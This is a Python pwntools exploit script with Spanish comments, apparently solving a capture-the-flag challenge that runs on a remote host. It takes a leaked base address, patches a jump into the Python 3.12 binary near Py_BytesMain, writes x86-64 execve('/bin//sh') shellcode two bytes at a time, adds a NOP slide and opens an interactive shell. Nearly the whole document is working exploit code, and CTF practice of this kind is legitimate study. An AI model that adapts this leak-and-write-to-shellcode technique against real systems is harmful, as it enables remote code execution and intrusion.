from pwn import *

context.arch = "amd64"

elf = ELF("./python3.12/bin/python3.12")

#io = remote("127.0.0.1", 21337)
io = remote("ponpy.ctfz.zone", 21337)

io.recvuntil("You desired python base is ")

leak_base_address = int(io.recvline().strip().decode(), 16)

elf.address = leak_base_address

print(f"Address de Py_FinalizeEx: {hex(elf.sym.Py_BytesMain + 107)}")

# La direccion a editar
io.sendlineafter("Gimme the off: ", hex(elf.sym.Py_BytesMain + 107))
payload = b"\xeb\xec"
#input("PAUSE")
io.sendlineafter("Gimme the loot: ", payload)

# Ahora Aqui se hacen los verdaderos cambios para obtener una shell o imprimir la flag
# Sera la ultima vez que cambiara nuestro PIE ya que ya esta alterado el flujo

io.recvuntil("You desired python base is ")

leak_base_address = int(io.recvline().strip().decode(), 16)

elf.address = leak_base_address

# En vez de modificar Py_FinalizeEx, editaremos el mismo PyFinalizeEx pero +2 bytes
# Ahi estara el shellcode

target_address = (elf.sym.Py_BytesMain + 107) + 2

print(f"Address target: {hex(elf.sym.Py_BytesMain + 107 + 2)}")

# No olvides que el shellcode debe ser de longitud par porque editamos de dos en dos bytes

shellcode = """
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 0x3b
    pop rax
    cdq
    syscall
"""

shellcode = asm(shellcode) 

if len(shellcode) % 2 != 0: # Si la longitud es impar agregar un \x00 mas para que sea par (x = 2n +1, x sera par)
    shellcode += b"\x00"

print(len(shellcode))

for i in range(len(shellcode) // 2):
    io.sendlineafter("Gimme the off: ", hex(target_address + (i * 2)))
    io.sendlineafter("Gimme the loot: ", shellcode[(i * 2): ((i*2) + 2)])

# Colchon de nops para que se haga un slide al shellcode
io.sendlineafter("Gimme the off: ", hex(target_address - 2))
io.sendlineafter("Gimme the loot: ", b"\x90\x90")


io.interactive()

